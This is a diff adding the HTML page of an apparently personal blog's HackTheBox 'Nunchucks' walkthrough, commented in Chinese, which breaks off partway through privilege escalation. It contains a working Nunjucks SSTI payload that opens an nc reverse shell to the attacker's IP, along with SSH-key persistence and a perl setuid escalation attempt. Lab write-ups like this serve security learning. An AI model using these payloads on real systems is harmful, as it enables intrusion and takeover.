@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox Nunchucks Walkthrough - Kur0&#39;s blog</title><meta name="Description" content="HackTheBox Nunchucks Walkthrough"><meta property="og:url" content="http://localhost:1313/hackthebox-nunchucks-walkthrough/">
+  <meta property="og:site_name" content="Kur0&#39;s blog">
+  <meta property="og:title" content="HackTheBox Nunchucks Walkthrough">
+  <meta property="og:description" content="HackTheBox Nunchucks Walkthrough">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-02-11T09:47:03+00:00">
+    <meta property="article:modified_time" content="2025-02-27T10:56:29+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="NodeJS">
+    <meta property="article:tag" content="SSTI">
+    <meta property="article:tag" content="SUID">
+    <meta property="og:image" content="http://localhost:1313/hackthebox-nunchucks-walkthrough/cover.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/hackthebox-nunchucks-walkthrough/cover.png">
+  <meta name="twitter:title" content="HackTheBox Nunchucks Walkthrough">
+  <meta name="twitter:description" content="HackTheBox Nunchucks Walkthrough">
+<meta name="application-name" content="Kur0&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Kur0&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/hackthebox-nunchucks-walkthrough/" /><link rel="prev" href="http://localhost:1313/buuctf-buu-brute-1-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox Nunchucks Walkthrough",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/hackthebox-nunchucks-walkthrough\/"
+        },"genre": "posts","keywords": "writeup, hackthebox, Linux, NodeJS, SSTI, SUID","wordcount":  994 ,
+        "url": "http:\/\/localhost:1313\/hackthebox-nunchucks-walkthrough\/","datePublished": "2022-02-11T09:47:03+00:00","dateModified": "2025-02-27T10:56:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Kur0"
+            },"description": "HackTheBox Nunchucks Walkthrough"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Kur0&#39;s blog">Kur0&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Kur0&#39;s blog">Kur0&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox Nunchucks Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Kur0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-02-11">2022-02-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;994 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#web-application">Web Application</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ssti">SSTI</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> -T4 10.10.11.222 <span class="p">|</span> grep ^<span class="o">[</span>0-9<span class="o">]</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># $ports=22,80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nmap -sC -sV -p<span class="nv">$ports</span> 10.10.11.122
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.122
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.32s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nunchucks - Landing Page
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>Nunchucks-CA/countryName<span class="o">=</span>US
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-08-30T15:42:24
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2031-08-28T15:42:24
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_SHA-1: 518c 0fd1 <span class="m">6903</span> 75c0 f26b a6cb e37d 53b8 a3ff 858b
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span></span></span></code></pre></div></div><h2 id="web-application">Web Application</h2>
+<p>修改hosts文件</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nb">echo</span> <span class="s2">&#34;10.10.11.122  nunchucks.htb&#34;</span> &gt;&gt; /etc/hosts</span></span></code></pre></div></div><p>访问网站，自动转为https协议，扫描目录</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirsearch -u <span class="s1">&#39;https://nunchucks.htb&#39;</span>   
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:09:36<span class="o">]</span> Starting:                       
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:09:42<span class="o">]</span> <span class="m">400</span> -  166B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:10:37<span class="o">]</span> <span class="m">301</span> -  179B  - /assets  -&gt;  /assets/                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:10:44<span class="o">]</span> <span class="m">400</span> -  166B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd    
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:16<span class="o">]</span> <span class="m">200</span> -    9KB - /login           
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:17<span class="o">]</span> <span class="m">200</span> -    9KB - /login/          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:37<span class="o">]</span> <span class="m">200</span> -   19KB - /privacy         
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:42<span class="o">]</span> <span class="m">400</span> -    1KB - /servlet/%C0%AE%C0%AE%C0%AF                      
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:45<span class="o">]</span> <span class="m">200</span> -    9KB - /signup          
+</span></span><span class="line"><span class="cl"><span class="o">[</span>23:11:53<span class="o">]</span> <span class="m">200</span> -   17KB - /terms           
+</span></span><span class="line"><span class="cl">Task Completed</span></span></code></pre></div></div><p>发现注册和登录页面，访问注册页面进行注册</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-nunchucks-walkthrough/signup.png"
+        data-srcset="/hackthebox-nunchucks-walkthrough/signup.png, /hackthebox-nunchucks-walkthrough/signup.png 1.5x, /hackthebox-nunchucks-walkthrough/signup.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-nunchucks-walkthrough/signup.png"
+        title="signup" width="537" height="507" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-nunchucks-walkthrough/login.png"
+        data-srcset="/hackthebox-nunchucks-walkthrough/login.png, /hackthebox-nunchucks-walkthrough/login.png 1.5x, /hackthebox-nunchucks-walkthrough/login.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-nunchucks-walkthrough/login.png"
+        title="login" width="529" height="394" /></p>
+<p>注册、登录均关闭，继续爆破子域名</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw <span class="m">2271</span> -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span>  -u <span class="s2">&#34;https://nunchucks.htb&#34;</span>            
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: https://nunchucks.htb/
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">4997</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>      
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000081:   <span class="m">200</span>        <span class="m">101</span> L    <span class="m">259</span> W      <span class="m">4028</span> Ch     <span class="s2">&#34;store&#34;</span> </span></span></code></pre></div></div><p>hosts文件加入store.nunchucks.htb后访问页面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-nunchucks-walkthrough/store.png"
+        data-srcset="/hackthebox-nunchucks-walkthrough/store.png, /hackthebox-nunchucks-walkthrough/store.png 1.5x, /hackthebox-nunchucks-walkthrough/store.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-nunchucks-walkthrough/store.png"
+        title="store" width="1116" height="634" /></p>
+<hr>
+<h1 id="vuln">Vuln</h1>
+<h2 id="ssti">SSTI</h2>
+<p>输入邮箱地址，通过burp抓包修改参数可以发现SSTI漏洞</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-nunchucks-walkthrough/burp.png"
+        data-srcset="/hackthebox-nunchucks-walkthrough/burp.png, /hackthebox-nunchucks-walkthrough/burp.png 1.5x, /hackthebox-nunchucks-walkthrough/burp.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-nunchucks-walkthrough/burp.png"
+        title="burp" width="947" height="435" /></p>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks" target="_blank" rel="noopener noreffer ">NUNJUCKS(NodeJS) SSTI vulnerability</a></p></blockquote>
+<p>模板注入反弹shell</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># payload:{{range.constructor(\&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.4 4444 &gt;/tmp/f&#39;)\&#34;)()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.16.4<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">49368</span>
+</span></span><span class="line"><span class="cl">sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/var/www/store.nunchucks
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取sshshell</span>
+</span></span><span class="line"><span class="cl">$ mkdir .ssh
+</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> .ssh
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> id_rsa.pub &gt; authorized_keys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ssh david@10.10.11.122                                                                          
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-86-generic x86_64<span class="o">)</span>                                   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com                                                          
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com                                                  
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage                                                     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Fri <span class="m">11</span> Feb 01:11:31 UTC <span class="m">2022</span>                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:             0.55                                                                     
+</span></span><span class="line"><span class="cl">  Usage of /:              48.8% of 6.82GB                                                          
+</span></span><span class="line"><span class="cl">  Memory usage:            45%                                                                      
+</span></span><span class="line"><span class="cl">  Swap usage:              0%                                                                       
+</span></span><span class="line"><span class="cl">  Processes:               <span class="m">270</span>                                                                      
+</span></span><span class="line"><span class="cl">  Users logged in:         <span class="m">0</span>                                                                        
+</span></span><span class="line"><span class="cl">  IPv4 address <span class="k">for</span> ens160: 10.10.11.122                                                             
+</span></span><span class="line"><span class="cl">  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:19d7                                            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">10</span> updates can be applied immediately.                                                              
+</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable                                          
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.                                              
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span></span></span></code></pre></div></div><hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>查看可执行文件</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">david@nunchucks:/tmp$ find / -type f -perm -u<span class="o">=</span>s 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/fusermount
+</span></span><span class="line"><span class="cl">/usr/bin/umount
+</span></span><span class="line"><span class="cl">/usr/bin/chsh
+</span></span><span class="line"><span class="cl">/usr/bin/chfn
+</span></span><span class="line"><span class="cl">/usr/bin/at
+</span></span><span class="line"><span class="cl">/usr/bin/mount
+</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">/usr/bin/newgrp
+</span></span><span class="line"><span class="cl">/usr/bin/passwd
+</span></span><span class="line"><span class="cl">/usr/bin/pkexec
+</span></span><span class="line"><span class="cl">/usr/bin/su
+</span></span><span class="line"><span class="cl">/usr/bin/sudo
+</span></span><span class="line"><span class="cl">/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">/usr/sbin/pppd</span></span></code></pre></div></div><p>同时查看网站配置文件发现mysql用户名密码，经测试均无法提权</p>
+<p>最后经网上搜索发现通过getcap查看文件capabilities</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">david@nunchucks:/tmp$ getcap -r / 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/perl <span class="o">=</span> cap_setuid+ep
+</span></span><span class="line"><span class="cl">/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
+</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep</span></span></code></pre></div></div><p>发现perl有cap_setuid+ep属性，可以通过perl提权
+参考<a href="https://gtfobins.github.io/gtfobins/perl/#capabilities" target="_blank" rel="noopener noreffer ">https://gtfobins.github.io/gtfobins/perl/#capabilities</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 尝试提权</span>
+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;</span> 
+</span></span><span class="line"><span class="cl">david@nunchucks:/tmp$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 未成功 - -</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用其他命令</span>
